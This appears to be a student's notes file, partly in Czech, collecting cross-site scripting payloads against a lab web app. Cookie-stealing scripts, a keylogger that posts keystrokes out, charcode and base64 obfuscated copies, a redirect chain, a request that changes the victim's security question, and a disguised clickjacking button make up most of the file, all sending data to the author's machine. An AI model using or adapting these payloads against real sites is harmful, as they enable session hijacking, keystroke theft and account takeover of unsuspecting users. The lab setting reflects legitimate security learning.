Kódování je dělaný na IP na mojí virtuálku. 
Vlastní kódování 
------------------------------------------------------------------------
https://eve.gd/2007/05/23/string-fromcharcode-encoder/
------------------------------------------------------------------------
Super pomocník, jinak bych to nezvládl a postačil by mi alert.
Nemám vlastní server :(( (ZATÍM)












COOKIE GRAB - REDIRECT
------------------------------------------------------------------------
<script>var u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,63,99,61);u=u.concat(document.cookie);window.location.replace(u);</script>

OBFUSCATED WITH CharCode
<script>eval(String.fromCharCode(60,115,99,114,105,112,116,62,118,97,114,32,117,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,53,51,44,52,55,44,54,51,44,57,57,44,54,49,41,59,117,61,117,46,99,111,110,99,97,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,117,41,59,60,47,115,99,114,105,112,116,62))
</script>
------------------------------------------------------------------------
COOKIE GRAB - IMAGE
------------------------------------------------------------------------
<script>var u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,63,99,61);u=u.concat(document.cookie);var img = new Image(); img.src=u;</script>

OBFUSCATED WITH CharCode
<script>eval(String.fromCharCode(118,97,114,32,117,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,53,51,44,52,55,44,54,51,44,57,57,44,54,49,41,59,117,61,117,46,99,111,110,99,97,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59,118,97,114,32,105,109,103,32,61,32,110,101,119,32,73,109,97,103,101,40,41,59,32,105,109,103,46,115,114,99,61,117,59))
</script>
------------------------------------------------------------------------
KEYLOGGER 
------------------------------------------------------------------------
<script>
document.onkeypress = function (evt) {
	evt = evt || window.event;
	key = String.fromCharCode(evt.charCode);
	if (key) {
		var http = new XMLHttpRequest();
		var param = encodeURI(key);
		var p = String.fromCharCode(80,79,83,84);
		var url = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,107,108,111,103,46,112,104,112);
		var k = String.fromCharCode(107,101,121,61);
		var ct = String.fromCharCode(67,111,110,116,101,110,116,45,116,121,112,101);
		var ap = String.fromCharCode(97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100);
		k = k.concat(param);
		http.open(p,url,true);
		http.setRequestHeader(ct,ap);
		http.send(k);
	}
}
</script>

OBFUSCATED WITH CharCode
<script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,111,110,107,101,121,112,114,101,115,115,32,61,32,102,117,110,99,116,105,111,110,32,40,101,118,116,41,32,123,10,9,101,118,116,32,61,32,101,118,116,32,124,124,32,119,105,110,100,111,119,46,101,118,101,110,116,59,10,9,107,101,121,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,118,116,46,99,104,97,114,67,111,100,101,41,59,10,9,105,102,32,40,107,101,121,41,32,123,10,9,9,118,97,114,32,104,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,9,9,118,97,114,32,112,97,114,97,109,32,61,32,101,110,99,111,100,101,85,82,73,40,107,101,121,41,59,10,9,9,118,97,114,32,112,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,56,48,44,55,57,44,56,51,44,56,52,41,59,10,9,9,118,97,114,32,117,114,108,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,53,51,44,52,55,44,49,48,55,44,49,48,56,44,49,49,49,44,49,48,51,44,52,54,44,49,49,50,44,49,48,52,44,49,49,50,41,59,10,9,9,118,97,114,32,107,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,55,44,49,48,49,44,49,50,49,44,54,49,41,59,10,9,9,118,97,114,32,99,116,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,54,55,44,49,49,49,44,49,49,48,44,49,49,54,44,49,48,49,44,49,49,48,44,49,49,54,44,52,53,44,49,49,54,44,49,50,49,44,49,49,50,44,49,48,49,41,59,10,9,9,118,97,114,32,97,112,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,57,55,44,49,49,50,44,49,49,50,44,49,48,56,44,49,48,53,44,57,57,44,57,55,44,49,49,54,44,49,48,53,44,49,49,49,44,49,49,48,44,52,55,44,49,50,48,44,52,53,44,49,49,57,44,49,49,57,44,49,49,57,44,52,53,44,49,48,50,44,49,49,49,44,49,49,52,44,49,48,57,44,52,53,44,49,49,55,44,49,49,52,44,49,48,56,44,49,48,49,44,49,49,48,44,57,57,44,49,49,49,44,49,48,48,44,49,48,49,44,49,48,48,41,59,10,9,9,107,32,61,32,107,46,99,111,110,99,97,116,40,112,97,114,97,109,41,59,10,9,9,104,116,116,112,46,111,112,101,110,40,112,44,117,114,108,44,116,114,117,101,41,59,10,9,9,104,116,116,112,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,99,116,44,97,112,41,59,10,9,9,104,116,116,112,46,115,101,110,100,40,107,41,59,10,9,125,10,125));
</script>
OBFUSCATED WITH CharCode and BASE64
<script>
var o = String.fromCharCode(90,71,57,106,100,87,49,108,98,110,81,117,98,50,53,114,90,88,108,119,99,109,86,122,99,121,65,57,73,71,90,49,98,109,78,48,97,87,57,117,73,67,104,108,100,110,81,112,73,72,115,75,67,87,86,50,100,67,65,57,73,71,86,50,100,67,66,56,102,67,66,51,97,87,53,107,98,51,99,117,90,88,90,108,98,110,81,55,67,103,108,114,90,88,107,103,80,83,66,84,100,72,74,112,98,109,99,117,90,110,74,118,98,85,78,111,89,88,74,68,98,50,82,108,75,71,86,50,100,67,53,106,97,71,70,121,81,50,57,107,90,83,107,55,67,103,108,112,90,105,65,111,97,50,86,53,75,83,66,55,67,103,107,74,100,109,70,121,73,71,104,48,100,72,65,103,80,83,66,117,90,88,99,103,87,69,49,77,83,72,82,48,99,70,74,108,99,88,86,108,99,51,81,111,75,84,115,75,67,81,108,50,89,88,73,103,99,71,70,121,89,87,48,103,80,83,66,108,98,109,78,118,90,71,86,86,85,107,107,111,97,50,86,53,75,84,115,75,67,81,108,50,89,88,73,103,99,67,65,57,73,70,78,48,99,109,108,117,90,121,53,109,99,109,57,116,81,50,104,104,99,107,78,118,90,71,85,111,79,68,65,115,78,122,107,115,79,68,77,115,79,68,81,112,79,119,111,74,67,88,90,104,99,105,66,49,99,109,119,103,80,83,66,84,100,72,74,112,98,109,99,117,90,110,74,118,98,85,78,111,89,88,74,68,98,50,82,108,75,68,69,119,78,67,119,120,77,84,89,115,77,84,69,50,76,68,69,120,77,105,119,49,79,67,119,48,78,121,119,48,78,121,119,48,79,83,119,48,79,67,119,48,78,105,119,48,79,67,119,48,78,105,119,49,77,67,119,48,78,105,119,48,79,83,119,49,77,121,119,48,78,121,119,120,77,68,99,115,77,84,65,52,76,68,69,120,77,83,119,120,77,68,77,115,78,68,89,115,77,84,69,121,76,68,69,119,78,67,119,120,77,84,73,112,79,119,111,74,67,88,90,104,99,105,66,114,73,68,48,103,85,51,82,121,97,87,53,110,76,109,90,121,98,50,49,68,97,71,70,121,81,50,57,107,90,83,103,120,77,68,99,115,77,84,65,120,76,68,69,121,77,83,119,50,77,83,107,55,67,103,107,74,100,109,70,121,73,71,78,48,73,68,48,103,85,51,82,121,97,87,53,110,76,109,90,121,98,50,49,68,97,71,70,121,81,50,57,107,90,83,103,50,78,121,119,120,77,84,69,115,77,84,69,119,76,68,69,120,78,105,119,120,77,68,69,115,77,84,69,119,76,68,69,120,78,105,119,48,78,83,119,120,77,84,89,115,77,84,73,120,76,68,69,120,77,105,119,120,77,68,69,112,79,119,111,74,67,88,90,104,99,105,66,104,99,67,65,57,73,70,78,48,99,109,108,117,90,121,53,109,99,109,57,116,81,50,104,104,99,107,78,118,90,71,85,111,79,84,99,115,77,84,69,121,76,68,69,120,77,105,119,120,77,68,103,115,77,84,65,49,76,68,107,53,76,68,107,51,76,68,69,120,78,105,119,120,77,68,85,115,77,84,69,120,76,68,69,120,77,67,119,48,78,121,119,120,77,106,65,115,78,68,85,115,77,84,69,53,76,68,69,120,79,83,119,120,77,84,107,115,78,68,85,115,77,84,65,121,76,68,69,120,77,83,119,120,77,84,81,115,77,84,65,53,76,68,81,49,76,68,69,120,78,121,119,120,77,84,81,115,77,84,65,52,76,68,69,119,77,83,119,120,77,84,65,115,79,84,107,115,77,84,69,120,76,68,69,119,77,67,119,120,77,68,69,115,77,84,65,119,75,84,115,75,67,81,108,114,73,68,48,103,97,121,53,106,98,50,53,106,89,88,81,111,99,71,70,121,89,87,48,112,79,119,111,74,67,87,104,48,100,72,65,117,98,51,66,108,98,105,104,119,76,72,86,121,98,67,120,48,99,110,86,108,75,84,115,75,67,81,108,111,100,72,82,119,76,110,78,108,100,70,74,108,99,88,86,108,99,51,82,73,90,87,70,107,90,88,73,111,89,51,81,115,89,88,65,112,79,119,111,74,67,87,104,48,100,72,65,117,99,50,86,117,90,67,104,114,75,84,115,75,67,88,48,75,102,81,61,61);
eval(atob(o));
</script>
OBFUSCATION BY REDIRECTING TO OUR SERVER
http://10.0.2.10/user/logout.php?return=/redir.php?url=http://10.0.2.15/totallylegit.php
------------------------------------------------------------------------

COMBINED ATTACK - COOKIE GRAB AND KEYGRABBER
sends the cookies to our server, then logs out user with keygrabber injected

FIRST RED
------------------------------------------------------------------------
http://10.0.2.10/inc/search.php&query=<script>var u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,105,110,100,101,114,46,112,104,112);
window.location.replace(u);
</script>lang=en<script>window.location.replace(http://10.0.2.10/user/logout.php?return=/redir.php?url=http://10.0.2.15/totallylegit.php)</script>.
------------------------------------------------------------------------
SECOND RED
------------------------------------------------------------------------
http://10.0.2.10/inder.php
<script>
var u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,105,110,100,101,114,46,112,104,112)
window.location.replace(u);
</script>
------------------------------------------------------------------------
MAIN
------------------------------------------------------------------------
<script>
var cok = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,105,110,99,47,115,101,97,114,99,104,46,112,104,112,38,113,117,101,114,121,61,60,115,99,114,105,112,116,62,118,97,114,32,117,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,52,56,44,52,55,44,49,48,53,44,49,49,48,44,49,48,48,44,49,48,49,44,49,49,52,44,52,54,44,49,49,50,44,49,48,52,44,49,49,50,41,59,10,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,117,41,59,10,60,47,115,99,114,105,112,116,62,108,97,110,103,61,101,110,60,115,99,114,105,112,116,62,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,117,115,101,114,47,108,111,103,111,117,116,46,112,104,112,63,114,101,116,117,114,110,61,47,114,101,100,105,114,46,112,104,112,63,117,114,108,61,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,116,111,116,97,108,108,121,108,101,103,105,116,46,112,104,112,41,60,47,115,99,114,105,112,116,62,46);
document.write(cok);
var u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,63,99,61);u=u.concat(document.cookie);var img = new Image(); img.src=u;
u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,109,97,103,111,114);
</script>
------------------------------------------------------------------------
in single URL = http://10.0.2.10/inc/search.php?query=<script>var cok = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,105,110,99,47,115,101,97,114,99,104,46,112,104,112,38,113,117,101,114,121,61,60,115,99,114,105,112,116,62,118,97,114,32,117,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,52,56,44,52,55,44,49,48,53,44,49,49,48,44,49,48,48,44,49,48,49,44,49,49,52,44,52,54,44,49,49,50,44,49,48,52,44,49,49,50,41,59,10,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,117,41,59,10,60,47,115,99,114,105,112,116,62,108,97,110,103,61,101,110,60,115,99,114,105,112,116,62,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,117,115,101,114,47,108,111,103,111,117,116,46,112,104,112,63,114,101,116,117,114,110,61,47,114,101,100,105,114,46,112,104,112,63,117,114,108,61,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,116,111,116,97,108,108,121,108,101,103,105,116,46,112,104,112,41,60,47,115,99,114,105,112,116,62,46);
document.write(cok);
var u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,63,99,61);u=u.concat(document.cookie);var img = new Image(); img.src=u;
u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,109,97,103,111,114);
</script>

------------------------------------------------------------------------

CHANGING SECURITY QUESTION AND CAMOUFLAGE BY REDIRECT
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST','http://10.0.2.10/settings/passchange',true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('Access-Control-Allow-Origin','http://10.0.2.10/');
xhr.send('question=3&answer=69');
setTimeout(function(){
window.location.replace("http://10.0.2.10/inc/search.php?query=karel");
},2000);
</script>

eval(String.fromCharCode(118,97,114,32,120,104,114,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,104,114,46,111,112,101,110,40,39,80,79,83,84,39,44,39,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,115,101,116,116,105,110,103,115,47,112,97,115,115,99,104,97,110,103,101,39,44,116,114,117,101,41,59,10,120,104,114,46,119,105,116,104,67,114,101,100,101,110,116,105,97,108,115,32,61,32,116,114,117,101,59,10,120,104,114,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,67,111,110,116,101,110,116,45,84,121,112,101,39,44,32,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,41,59,10,120,104,114,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,65,99,99,101,115,115,45,67,111,110,116,114,111,108,45,65,108,108,111,119,45,79,114,105,103,105,110,39,44,39,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,39,41,59,10,120,104,114,46,115,101,110,100,40,39,113,117,101,115,116,105,111,110,61,51,38,97,110,115,119,101,114,61,54,57,39,41,59,10,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,123,10,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,34,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,105,110,99,47,115,101,97,114,99,104,46,112,104,112,63,113,117,101,114,121,61,107,97,114,101,108,34,41,59,10,125,44,50,48,48,48,41,59));

------------------------------------------------------------------------

CLICKJACKING EXAMPLE - Changes security question after 2 secs, also sends cookies to my server.

------------------------------------------------------------------------
ENCODED

<script>document.write(String.fromCharCode(60,99,101,110,116,101,114,62,60,98,114,62,60,98,114,62,60,98,117,116,116,111,110,32,116,121,112,101,61,34,98,117,116,116,111,110,34,32,111,110,99,108,105,99,107,61,34,118,97,114,32,113,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,56,44,57,55,44,49,49,52,44,51,50,44,49,50,48,44,49,48,52,44,49,49,52,44,51,50,44,54,49,44,51,50,44,49,49,48,44,49,48,49,44,49,49,57,44,51,50,44,56,56,44,55,55,44,55,54,44,55,50,44,49,49,54,44,49,49,54,44,49,49,50,44,56,50,44,49,48,49,44,49,49,51,44,49,49,55,44,49,48,49,44,49,49,53,44,49,49,54,44,52,48,44,52,49,44,53,57,44,49,48,44,49,50,48,44,49,48,52,44,49,49,52,44,52,54,44,49,49,49,44,49,49,50,44,49,48,49,44,49,49,48,44,52,48,44,51,57,44,56,48,44,55,57,44,56,51,44,56,52,44,51,57,44,52,52,44,51,57,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,52,56,44,52,55,44,49,49,53,44,49,48,49,44,49,49,54,44,49,49,54,44,49,48,53,44,49,49,48,44,49,48,51,44,49,49,53,44,52,55,44,49,49,50,44,57,55,44,49,49,53,44,49,49,53,44,57,57,44,49,48,52,44,57,55,44,49,49,48,44,49,48,51,44,49,48,49,44,51,57,44,52,52,44,49,49,54,44,49,49,52,44,49,49,55,44,49,48,49,44,52,49,44,53,57,44,49,48,44,49,50,48,44,49,48,52,44,49,49,52,44,52,54,44,49,49,57,44,49,48,53,44,49,49,54,44,49,48,52,44,54,55,44,49,49,52,44,49,48,49,44,49,48,48,44,49,48,49,44,49,49,48,44,49,49,54,44,49,48,53,44,57,55,44,49,48,56,44,49,49,53,44,51,50,44,54,49,44,51,50,44,49,49,54,44,49,49,52,44,49,49,55,44,49,48,49,44,53,57,44,49,48,44,49,50,48,44,49,48,52,44,49,49,52,44,52,54,44,49,49,53,44,49,48,49,44,49,49,54,44,56,50,44,49,48,49,44,49,49,51,44,49,49,55,44,49,48,49,44,49,49,53,44,49,49,54,44,55,50,44,49,48,49,44,57,55,44,49,48,48,44,49,48,49,44,49,49,52,44,52,48,44,51,57,44,54,55,44,49,49,49,44,49,49,48,44,49,49,54,44,49,48,49,44,49,49,48,44,49,49,54,44,52,53,44,56,52,44,49,50,49,44,49,49,50,44,49,48,49,44,51,57,44,52,52,44,51,50,44,51,57,44,57,55,44,49,49,50,44,49,49,50,44,49,48,56,44,49,48,53,44,57,57,44,57,55,44,49,49,54,44,49,48,53,44,49,49,49,44,49,49,48,44,52,55,44,49,50,48,44,52,53,44,49,49,57,44,49,49,57,44,49,49,57,44,52,53,44,49,48,50,44,49,49,49,44,49,49,52,44,49,48,57,44,52,53,44,49,49,55,44,49,49,52,44,49,48,56,44,49,48,49,44,49,49,48,44,57,57,44,49,49,49,44,49,48,48,44,49,48,49,44,49,48,48,44,51,57,44,52,49,44,53,57,44,49,48,44,49,50,48,44,49,48,52,44,49,49,52,44,52,54,44,49,49,53,44,49,48,49,44,49,49,54,44,56,50,44,49,48,49,44,49,49,51,44,49,49,55,44,49,48,49,44,49,49,53,44,49,49,54,44,55,50,44,49,48,49,44,57,55,44,49,48,48,44,49,48,49,44,49,49,52,44,52,48,44,51,57,44,54,53,44,57,57,44,57,57,44,49,48,49,44,49,49,53,44,49,49,53,44,52,53,44,54,55,44,49,49,49,44,49,49,48,44,49,49,54,44,49,49,52,44,49,49,49,44,49,48,56,44,52,53,44,54,53,44,49,48,56,44,49,48,56,44,49,49,49,44,49,49,57,44,52,53,44,55,57,44,49,49,52,44,49,48,53,44,49,48,51,44,49,48,53,44,49,49,48,44,51,57,44,52,52,44,51,57,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,52,56,44,52,55,44,51,57,44,52,49,44,53,57,44,49,48,44,49,50,48,44,49,48,52,44,49,49,52,44,52,54,44,49,49,53,44,49,48,49,44,49,49,48,44,49,48,48,44,52,48,44,51,57,44,49,49,51,44,49,49,55,44,49,48,49,44,49,49,53,44,49,49,54,44,49,48,53,44,49,49,49,44,49,49,48,44,54,49,44,53,49,44,51,56,44,57,55,44,49,49,48,44,49,49,53,44,49,49,57,44,49,48,49,44,49,49,52,44,54,49,44,53,52,44,53,55,44,51,57,44,52,49,44,53,57,44,49,48,44,49,49,53,44,49,48,49,44,49,49,54,44,56,52,44,49,48,53,44,49,48,57,44,49,48,49,44,49,49,49,44,49,49,55,44,49,49,54,44,52,48,44,49,48,50,44,49,49,55,44,49,49,48,44,57,57,44,49,49,54,44,49,48,53,44,49,49,49,44,49,49,48,44,52,48,44,52,49,44,49,50,51,44,49,48,44,49,49,57,44,49,48,53,44,49,49,48,44,49,48,48,44,49,49,49,44,49,49,57,44,52,54,44,49,48,56,44,49,49,49,44,57,57,44,57,55,44,49,49,54,44,49,48,53,44,49,49,49,44,49,49,48,44,52,54,44,49,49,52,44,49,48,49,44,49,49,50,44,49,48,56,44,57,55,44,57,57,44,49,48,49,44,52,48,44,51,52,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,52,56,44,52,55,44,49,48,53,44,49,49,48,44,57,57,44,52,55,44,49,49,53,44,49,48,49,44,57,55,44,49,49,52,44,57,57,44,49,48,52,44,52,54,44,49,49,50,44,49,48,52,44,49,49,50,44,54,51,44,49,49,51,44,49,49,55,44,49,48,49,44,49,49,52,44,49,50,49,44,54,49,44,49,48,55,44,57,55,44,49,49,52,44,49,48,49,44,49,48,56,44,51,52,44,52,49,44,53,57,44,49,48,44,49,50,53,44,52,52,44,53,48,44,52,56,44,52,56,44,52,56,44,52,49,44,53,57,41,59,101,118,97,108,40,113,41,59,32,118,97,114,32,117,32,61,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,52,57,44,52,56,44,52,54,44,52,56,44,52,54,44,53,48,44,52,54,44,52,57,44,53,51,44,52,55,44,54,51,44,57,57,44,54,49,41,59,117,61,117,46,99,111,110,99,97,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59,118,97,114,32,105,109,103,32,61,32,110,101,119,32,73,109,97,103,101,40,41,59,32,105,109,103,46,115,114,99,61,117,59,34,62,67,104,99,105,32,112,105,118,111,33,60,47,98,117,116,116,111,110,62,60,47,99,101,110,116,101,114,62));</script>

------------------------------------------------------------------------
DECODED 

<center><br><br><button type="button" onclick="var q = String.fromCharCode(118,97,114,32,120,104,114,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,104,114,46,111,112,101,110,40,39,80,79,83,84,39,44,39,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,115,101,116,116,105,110,103,115,47,112,97,115,115,99,104,97,110,103,101,39,44,116,114,117,101,41,59,10,120,104,114,46,119,105,116,104,67,114,101,100,101,110,116,105,97,108,115,32,61,32,116,114,117,101,59,10,120,104,114,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,67,111,110,116,101,110,116,45,84,121,112,101,39,44,32,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,41,59,10,120,104,114,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,65,99,99,101,115,115,45,67,111,110,116,114,111,108,45,65,108,108,111,119,45,79,114,105,103,105,110,39,44,39,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,39,41,59,10,120,104,114,46,115,101,110,100,40,39,113,117,101,115,116,105,111,110,61,51,38,97,110,115,119,101,114,61,54,57,39,41,59,10,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,123,10,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,34,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,105,110,99,47,115,101,97,114,99,104,46,112,104,112,63,113,117,101,114,121,61,107,97,114,101,108,34,41,59,10,125,44,50,48,48,48,41,59);eval(q); var u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,63,99,61);u=u.concat(document.cookie);var img = new Image(); img.src=u;">Chci pivo!</button></center>









